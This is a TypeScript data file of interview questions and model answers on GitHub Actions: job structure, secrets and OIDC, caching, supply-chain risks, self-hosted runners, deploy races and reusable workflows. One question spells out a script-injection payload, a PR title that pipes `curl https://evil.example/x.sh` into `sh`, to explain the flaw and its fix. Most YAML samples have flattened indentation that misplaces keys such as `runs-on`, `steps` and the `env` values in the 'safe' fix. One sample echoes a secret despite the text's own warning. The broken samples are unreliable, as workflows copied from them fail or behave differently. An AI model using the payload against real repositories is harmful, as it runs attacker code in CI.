import type { InterviewQuestion } from '../../../types'

/** The questions that come up in almost every github-actions round. */
export const githubActionsCoreQuestions: InterviewQuestion[] = [
  {
    id: 'itv-gha-1',
    level: 'basic',
    kind: 'open',
    prompt:
      'Explain the structure of a GitHub Actions workflow: workflows, jobs, steps and runners.',
    probing: 'Basic literacy, and specifically whether you know each job gets a clean machine.',
    answer: [
      'A **workflow** is a YAML file in `.github/workflows/`. It is triggered by an event - a push, a pull request, a schedule, or a manual dispatch.',
      'A workflow contains **jobs**. By default all jobs run **in parallel**, each on its own fresh **runner** - a clean virtual machine or container. You create ordering with `needs`.',
      'A job contains **steps**, which run **sequentially on that one runner**, sharing its filesystem and workspace. A step either runs a shell command with `run`, or invokes a reusable **action** with `uses`.',
      'The consequence people forget is that **nothing persists between jobs**. Build in one job and test in another, and the second job starts with an empty machine - you have to pass the artefact explicitly with `upload-artifact` and `download-artifact`, or pass values with job `outputs`.',
    ],
    diagrams: [
      {
        kind: 'nested',
        title: 'The hierarchy, and where the boundary is',
        caption:
          'The runner boundary is the thing to remember: steps share a filesystem, jobs do not.',
        root: {
          label: 'Workflow (.github/workflows/ci.yml)',
          detail: 'Triggered by an event',
          tone: 'accent',
          children: [
            {
              label: 'Job: build',
              detail: 'Fresh runner. Runs in parallel with test.',
              children: [
                { label: 'Step: checkout', detail: 'uses: actions/checkout@v4' },
                { label: 'Step: npm ci', detail: 'run: - same filesystem as above' },
                { label: 'Step: upload-artifact', detail: 'The ONLY way out of this job' },
              ],
            },
            {
              label: 'Job: test',
              detail: 'A DIFFERENT fresh runner. Nothing from build is here.',
              children: [
                { label: 'Step: download-artifact', detail: 'Must fetch what build produced' },
              ],
            },
            {
              label: 'Job: deploy',
              detail: 'needs: [build, test] - waits for both',
              tone: 'success',
            },
          ],
        },
      },
    ],
    code: [
      {
        title: 'Ordering, and passing things between jobs',
        language: 'yaml',
        code: `name: CI
on:
  push:
  branches: [main]
  pull_request:

jobs:
  build:
  runs-on: ubuntu-latest
  # Values other jobs can read
  outputs:
    version: \${{ steps.meta.outputs.version }}
  steps:
    - uses: actions/checkout@v4
    - id: meta
      run: echo "version=1.2.\${{ github.run_number }}" >> "$GITHUB_OUTPUT"
    - run: npm ci && npm run build
    - uses: actions/upload-artifact@v4
      with:
        name: dist
        path: dist/

  test:
  runs-on: ubuntu-latest
  needs: build                     # without this, runs in parallel
  steps:
    - uses: actions/checkout@v4
    - uses: actions/download-artifact@v4
      with: { name: dist, path: dist/ }
    - run: npm ci && npm test
    - run: echo "Testing version \${{ needs.build.outputs.version }}"`,
      },
    ],
    traps: [
      'Assuming a file written in one job is available in the next. Each job is a clean machine.',
      'Forgetting `actions/checkout` - the runner does not have your code by default.',
    ],
    followUps: [
      'How do you pass a value from one job to another?',
      'How do you make jobs run in sequence?',
    ],
    tags: ['fundamentals', 'workflows', 'jobs'],
  },
  {
    id: 'itv-gha-2',
    level: 'basic',
    kind: 'mcq',
    prompt:
      'A workflow has three jobs with no `needs` between them. What happens when it is triggered?',
    options: [
      { id: 'a', text: 'They run in the order they are written in the file' },
      { id: 'b', text: 'They all run in parallel on separate runners' },
      { id: 'c', text: 'Only the first job runs; the rest need explicit triggers' },
      { id: 'd', text: 'They run sequentially on the same runner' },
    ],
    correct: ['b'],
    probing:
      'A fact with real cost implications - accidental parallelism burns runner minutes and can cause races.',
    answer: [
      'Jobs run **in parallel by default**, each on its own runner. YAML order is irrelevant.',
      'You create ordering with `needs`, which also makes the upstream job’s `outputs` available to the downstream one.',
      'This default is usually what you want - lint, unit tests and a build can all start at once - but it catches people out when two jobs touch the same external resource, or when they assume a deploy job will wait for tests it never declared a dependency on.',
    ],
    code: [
      {
        title: 'Fan out, then fan in',
        language: 'yaml',
        code: `jobs:
  lint:   { runs-on: ubuntu-latest, steps: [{ run: make lint }] }
  unit:   { runs-on: ubuntu-latest, steps: [{ run: make test-unit }] }
  build:  { runs-on: ubuntu-latest, steps: [{ run: make build }] }

  deploy:
  needs: [lint, unit, build]     # waits for ALL three
  runs-on: ubuntu-latest
  if: github.ref == 'refs/heads/main'
  steps: [{ run: make deploy }]`,
      },
    ],
    traps: [
      'Writing a deploy job after a test job and assuming it waits. Without `needs` it deploys while the tests are still running.',
    ],
    followUps: ['How would you make a job run even if a dependency failed?'],
    tags: ['jobs', 'needs', 'parallelism'],
  },
  {
    id: 'itv-gha-3',
    level: 'intermediate',
    kind: 'open',
    prompt:
      'How do you handle secrets in GitHub Actions, and what is the better alternative for cloud credentials?',
    probing:
      'Current best practice. Anyone still saying "put the AWS access key in secrets" is behind.',
    answer: [
      'Repository, environment or organisation **secrets** are encrypted and exposed to workflows as `${{ secrets.NAME }}`. GitHub masks them in logs on a best-effort basis.',
      'For cloud credentials, the modern answer is **not to store a secret at all**. GitHub can act as an **OIDC provider**: the workflow requests a short-lived token, and AWS, Azure or GCP exchanges it for temporary credentials by assuming a role. Nothing long-lived exists to leak or rotate.',
      'The trust policy on the cloud side is scoped by the OIDC `sub` claim, so you can restrict it to one repository and even one branch or environment. That is much stronger than a static key, which works from anywhere forever.',
      'Where a real secret is unavoidable, **environment secrets** with required reviewers are the tool - production credentials then only exist for a job that a human has approved.',
    ],
    deeper: [
      'Secrets are deliberately **not** passed to workflows triggered by `pull_request` from a fork. That is a security feature, and it is why fork PRs cannot deploy. Working around it with `pull_request_target` is how repositories get compromised.',
      'Masking is best-effort. A secret that is transformed - base64-encoded, or split - will not be masked. Never `echo` one.',
    ],
    code: [
      {
        title: 'OIDC to AWS, with no stored key',
        language: 'yaml',
        explanation:
          'The `id-token: write` permission is what allows the runner to request an OIDC token. Without it the action fails.',
        code: `permissions:
  id-token: write      # required to request the OIDC token
  contents: read       # least privilege for everything else

jobs:
  deploy:
  runs-on: ubuntu-latest
  environment: production        # can require reviewers
  steps:
    - uses: actions/checkout@v4

    - uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::111122223333:role/github-deploy
        aws-region: eu-west-1
        # No access key. No secret key. Nothing stored.

    - run: aws sts get-caller-identity
    - run: aws s3 sync ./dist s3://my-bucket/`,
      },
      {
        title: 'The trust policy that scopes it',
        language: 'json',
        explanation:
          'The `sub` condition is the important line - without it any repository in any organisation could assume this role.',
        code: `{
  "Effect": "Allow",
  "Principal": {
  "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
  },
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:acme/checkout-api:ref:refs/heads/main"
  }
  }
}`,
      },
    ],
    traps: [
      'Storing a long-lived AWS access key in secrets when OIDC is available.',
      'Writing the trust policy without a `sub` condition, so any repository can assume the role.',
      'Echoing a secret to debug it.',
    ],
    followUps: [
      'Why can a fork PR not access secrets?',
      'What does the `id-token: write` permission do?',
      'How would you scope the role to one environment?',
    ],
    tags: ['security', 'secrets', 'oidc', 'aws'],
  },
  {
    id: 'itv-gha-4',
    level: 'intermediate',
    kind: 'open',
    prompt: 'How do you speed up a slow GitHub Actions workflow?',
    probing:
      'Practical optimisation. They want caching, parallelism and matrix builds, and ideally measurement first.',
    answer: [
      'First I would find out **where** the time goes, because the fix depends on it. The timing breakdown per step in the run view usually makes it obvious within a minute.',
      'The biggest single win is normally **caching dependencies**. `actions/cache` - or the built-in `cache` option on `setup-node`, `setup-python` and friends - restores the package manager cache keyed on the lockfile hash, which turns a two-minute install into a few seconds.',
      'Next, **parallelism**. Split independent work into separate jobs so they run at once, and use a **matrix** to run the same job across versions or shards in parallel rather than in a loop.',
      'Then **do less work**: `paths` filters so a docs change does not run the full build, `concurrency` with `cancel-in-progress` so pushing twice cancels the stale run, and shallow checkout (`fetch-depth: 1`) unless you genuinely need history.',
      'For Docker builds specifically, `docker/build-push-action` with GitHub Actions cache (`cache-from: type=gha`) gives you layer caching across runs, which is otherwise completely absent on ephemeral runners.',
    ],
    code: [
      {
        title: 'Caching, matrix, and cancelling superseded runs',
        language: 'yaml',
        code: `# Pushing twice cancels the first run instead of paying for both
concurrency:
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true

on:
  push:
  paths-ignore: ['docs/**', '**.md']    # do not build for a typo fix

jobs:
  test:
  runs-on: ubuntu-latest
  strategy:
    fail-fast: false
    matrix:
      node: [20, 22]
      shard: [1, 2, 3]                  # 6 parallel jobs
  steps:
    - uses: actions/checkout@v4
      with: { fetch-depth: 1 }

    - uses: actions/setup-node@v4
      with:
        node-version: \${{ matrix.node }}
        cache: npm                      # built-in dependency cache

    - run: npm ci
    - run: npm test -- --shard=\${{ matrix.shard }}/3

  docker:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: docker/setup-buildx-action@v3
    - uses: docker/build-push-action@v6
      with:
        push: false
        cache-from: type=gha            # layer cache across runs
        cache-to: type=gha,mode=max`,
      },
    ],
    deeper: [
      '`fail-fast: false` is worth knowing: by default one failing matrix job cancels the rest, which is efficient but hides whether the failure is version-specific. For a test matrix you usually want to see all results.',
      'Cache keys matter. Keying on a lockfile hash with a looser `restore-keys` fallback gives you a warm cache even when a dependency changes.',
    ],
    traps: [
      'Caching `node_modules` directly instead of the package manager cache. It goes stale across platforms and Node versions and causes very confusing failures.',
      'Adding parallelism without checking where the time actually goes.',
    ],
    followUps: [
      'What is the risk of caching node_modules?',
      'What does fail-fast do?',
      'How do you avoid paying for runs you no longer care about?',
    ],
    tags: ['performance', 'caching', 'matrix'],
  },
  {
    id: 'itv-gha-5',
    level: 'advanced',
    kind: 'multi',
    prompt:
      'Which of these are genuine supply-chain risks in GitHub Actions? (Select all that apply.)',
    options: [
      { id: 'a', text: 'Referencing a third-party action by tag, e.g. `some/action@v3`' },
      { id: 'b', text: 'Using `pull_request_target` with a checkout of the PR head' },
      { id: 'c', text: 'Granting the default `GITHUB_TOKEN` write permissions workflow-wide' },
      { id: 'd', text: 'Using `actions/checkout@v4` from GitHub itself' },
      {
        id: 'e',
        text: 'Interpolating `${{ github.event.pull_request.title }}` into a `run` block',
      },
    ],
    correct: ['a', 'b', 'c', 'e'],
    probing:
      'A senior security question. Option E - script injection via untrusted input - is the one most people miss.',
    answer: [
      'A, B, C and E are all real risks. D is fine - `actions/checkout` is first-party and versioned.',
      '**A, tags are mutable.** Whoever owns the action can move `v3` to point at new code, which then runs in your pipeline with your secrets. Pin to a full commit SHA instead.',
      '**B, `pull_request_target`** runs in the context of the **base** repository - with write permissions and access to secrets - but if you then check out the PR head, you are executing an untrusted contributor’s code with those privileges. This is the single most exploited GitHub Actions misconfiguration.',
      '**C, over-broad token.** The default `GITHUB_TOKEN` should be `contents: read` at workflow level, with write granted only to the specific job that needs it.',
      '**E, script injection.** `${{ }}` expressions are substituted into the shell script **before** it runs. A pull request titled `"; curl evil.sh | sh #` becomes part of your command. The fix is to pass the value through an environment variable, which the shell treats as data.',
    ],
    code: [
      {
        title: 'The script-injection trap and its fix',
        language: 'yaml',
        explanation:
          'The first form pastes attacker-controlled text straight into the script. The second passes it as data the shell never parses.',
        code: `# VULNERABLE - the title is interpolated into the script
- run: echo "PR title: \${{ github.event.pull_request.title }}"
# A PR titled:  "; curl https://evil.example/x.sh | sh #
# produces:     echo "PR title: "; curl https://evil.example/x.sh | sh #"

# SAFE - passed as an environment variable, quoted
- env:
  TITLE: \${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"`,
      },
      {
        title: 'Pinning and least privilege',
        language: 'yaml',
        code: `# Read-only by default for the whole workflow
permissions:
  contents: read

jobs:
  release:
  runs-on: ubuntu-latest
  # Grant write only where it is needed
  permissions:
    contents: write
    id-token: write
  steps:
    # First-party, tag is acceptable
    - uses: actions/checkout@v4

    # Third-party: pinned to a full SHA, with the version in a comment
    - uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0

    # Dependabot can still bump these SHAs for you`,
      },
    ],
    traps: [
      'Thinking a version tag is immutable. Only a full commit SHA is.',
      'Using `pull_request_target` to "make secrets work on fork PRs". That is precisely the attack.',
    ],
    followUps: [
      'How would you safely build a fork PR that needs a secret?',
      'What does the default GITHUB_TOKEN have access to?',
      'How do you keep pinned SHAs up to date?',
    ],
    tags: ['security', 'supply chain', 'permissions'],
  },
  {
    id: 'itv-gha-6',
    level: 'advanced',
    kind: 'open',
    prompt: 'When would you use self-hosted runners, and what do you have to be careful about?',
    probing:
      'Trade-off reasoning plus a specific, serious security caveat about public repositories.',
    answer: [
      'Self-hosted runners make sense when you need something GitHub-hosted runners cannot give you: **network access** to private resources like an internal registry or a database behind a VPN; **specialised hardware** such as GPUs or a particular architecture; **compliance** requiring builds inside your own network; or **cost** at very high volume, where hosted minutes become expensive.',
      'The overriding caution is that you should **never attach a self-hosted runner to a public repository**. Anyone can open a pull request, and on a public repository that can cause code to execute on your runner - which is a machine inside your network. GitHub documents this explicitly and it has been exploited repeatedly.',
      'The other risk is **persistence**. Unlike hosted runners, a self-hosted runner is not destroyed after a job. State, caches and credentials left behind by one job are visible to the next, which is both a flakiness source and a cross-job data-leak path.',
      'The mitigation is ephemeral runners: run each job in a fresh container or VM. **Actions Runner Controller** on Kubernetes is the usual way - it creates a Pod per job and destroys it afterwards, giving you hosted-runner isolation with self-hosted networking.',
    ],
    deeper: [
      'Other hardening: run the runner as an unprivileged user, never as root; put it in an isolated network segment with only the egress it needs; and use repository or environment-scoped runner groups so one team’s jobs cannot land on another team’s runners.',
    ],
    traps: [
      'Attaching a self-hosted runner to a public repository. This is the headline warning in GitHub’s own documentation.',
      'Reusing a long-lived runner and being surprised by flaky builds caused by leftover state.',
    ],
    followUps: [
      'How would you make a self-hosted runner ephemeral?',
      'Why is a public repository specifically dangerous here?',
    ],
    tags: ['runners', 'security', 'self-hosted', 'arc'],
  },
  {
    id: 'itv-gha-7',
    level: 'advanced',
    kind: 'scenario',
    prompt:
      'Your deploy workflow occasionally deploys an older commit over a newer one. What is happening and how do you fix it?',
    probing:
      'A genuinely subtle concurrency problem. It tests whether you reason about race conditions in pipelines.',
    answer: [
      'This is a race between two workflow runs. Two commits land close together, both trigger a deploy, and the runs overlap. If the run for the **older** commit happens to finish its deploy step last, it overwrites the newer one.',
      'It is easy to miss because each run individually succeeds - there is no failure anywhere, just the wrong end state.',
      'The fix is the `concurrency` key with a **group** that identifies the deployment target. GitHub then allows only one run per group at a time and queues the rest. Crucially, for deploys you want `cancel-in-progress: false` - cancelling a half-finished deploy is worse than queuing behind it.',
      'For the CI part of the same workflow the opposite is right: `cancel-in-progress: true` on a per-branch group, so pushing twice in quick succession cancels the stale test run instead of paying for it.',
      'Belt and braces: have the deploy job verify it is deploying the current tip of the branch, and skip if it is not. That protects against anything concurrency does not cover.',
    ],
    diagrams: [
      {
        kind: 'sequence',
        title: 'How the older commit wins',
        caption: 'Both runs succeed. Nothing errors. The end state is simply the older artefact.',
        participants: [
          { id: 'a', label: 'Run for commit A' },
          { id: 'b', label: 'Run for commit B' },
          { id: 'prod', label: 'Production' },
        ],
        messages: [
          { from: 'a', to: 'a', label: 'commit A pushed, build starts' },
          { from: 'b', to: 'b', label: 'commit B pushed 30s later' },
          { from: 'b', to: 'prod', label: 'B finishes first, deploys B' },
          { from: 'a', to: 'prod', label: 'A finishes late, deploys A over B' },
          { from: 'prod', to: 'a', label: 'both runs green, wrong code live', kind: 'return' },
        ],
      },
    ],
    code: [
      {
        title: 'Concurrency groups, and a tip check',
        language: 'yaml',
        code: `# One deploy per environment at a time. Do NOT cancel a
# deploy that is already running - queue behind it instead.
concurrency:
  group: deploy-production
  cancel-in-progress: false

jobs:
  deploy:
  runs-on: ubuntu-latest
  environment: production
  steps:
    - uses: actions/checkout@v4

    # Belt and braces: refuse to deploy a stale commit.
    - name: Ensure this is still the tip of main
      run: |
        git fetch origin main
        LATEST="$(git rev-parse origin/main)"
        if [ "$GITHUB_SHA" != "$LATEST" ]; then
          echo "::notice::$GITHUB_SHA is behind $LATEST - skipping deploy"
          exit 0
        fi

    - run: make deploy

# For the CI workflow, the opposite setting is right:
# concurrency:
#   group: ci-\${{ github.ref }}
#   cancel-in-progress: true`,
      },
    ],
    traps: [
      'Using `cancel-in-progress: true` on a deploy. You then abort deployments halfway, which can be worse than the original problem.',
      'Grouping by commit SHA rather than by target. Every run gets its own group and nothing is serialised.',
    ],
    followUps: [
      'Why cancel-in-progress false for deploys but true for CI?',
      'How would you catch this in testing rather than production?',
    ],
    tags: ['scenario', 'concurrency', 'deployment', 'race conditions'],
  },
  {
    id: 'itv-gha-8',
    level: 'advanced',
    kind: 'open',
    prompt: 'How do you share workflow logic across many repositories?',
    probing: 'Scale. They want reusable workflows versus composite actions and when each fits.',
    answer: [
      'There are two mechanisms and they solve different problems.',
      'A **reusable workflow** is a whole workflow that another workflow calls with `uses:` at the **job** level. It brings its own jobs and runners, and it can take `inputs` and `secrets`. Use it when you want to share an entire pipeline - "the standard build, test and deploy for a Node service".',
      'A **composite action** bundles several **steps** into one reusable step. It runs inside the caller’s job on the caller’s runner. Use it for a repeated fragment - "set up our toolchain and authenticate to the registry".',
      'So the rule is: sharing whole jobs means a reusable workflow; sharing steps within a job means a composite action.',
      'Both should be **versioned by tag or SHA**, not tracked on `main`, for the same reason as Jenkins shared libraries: otherwise one commit in the shared repository can break every pipeline in the organisation at once.',
    ],
    code: [
      {
        title: 'A reusable workflow and its caller',
        language: 'yaml',
        code: `# --- .github/workflows/node-service.yml in acme/workflows
on:
  workflow_call:
  inputs:
    node-version: { type: string, default: '20' }
    deploy:       { type: boolean, default: false }
  secrets:
    REGISTRY_TOKEN: { required: true }

jobs:
  build:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with: { node-version: \${{ inputs.node-version }}, cache: npm }
    - run: npm ci && npm test && npm run build

  deploy:
  if: \${{ inputs.deploy }}
  needs: build
  runs-on: ubuntu-latest
  steps:
    - run: echo "deploying with \${{ secrets.REGISTRY_TOKEN }}"

# --- The ENTIRE workflow in a consuming repository
name: CI
on: [push, pull_request]

jobs:
  ci:
  uses: acme/workflows/.github/workflows/node-service.yml@v2.1.0
  with:
    node-version: '22'
    deploy: \${{ github.ref == 'refs/heads/main' }}
  secrets:
    REGISTRY_TOKEN: \${{ secrets.REGISTRY_TOKEN }}`,
      },
      {
        title: 'A composite action, for sharing steps',
        language: 'yaml',
        code: `# --- .github/actions/setup/action.yml
name: Set up toolchain
inputs:
  node-version:
  required: false
  default: '20'
runs:
  using: composite
  steps:
  - uses: actions/setup-node@v4
    with:
      node-version: \${{ inputs.node-version }}
      cache: npm
  - run: npm ci
    shell: bash          # required in composite actions
  - run: echo "$(npm bin)" >> "$GITHUB_PATH"
    shell: bash

# --- Used inside a job, on the caller's runner
steps:
  - uses: actions/checkout@v4
  - uses: ./.github/actions/setup
  with: { node-version: '22' }
  - run: npm test`,
      },
    ],
    traps: [
      'Referencing a shared workflow by `@main`. A single bad commit then breaks every repository at once.',
      'Forgetting `shell: bash` on `run` steps inside a composite action - it is required there and optional elsewhere.',
      'Expecting secrets to be inherited automatically. They must be passed explicitly, or with `secrets: inherit`.',
    ],
    followUps: [
      'When would you pick a composite action over a reusable workflow?',
      'How do you pass secrets to a reusable workflow?',
      'How would you roll out a change to a shared workflow safely?',
    ],
    tags: ['reusable workflows', 'composite actions', 'scale'],
  },
]
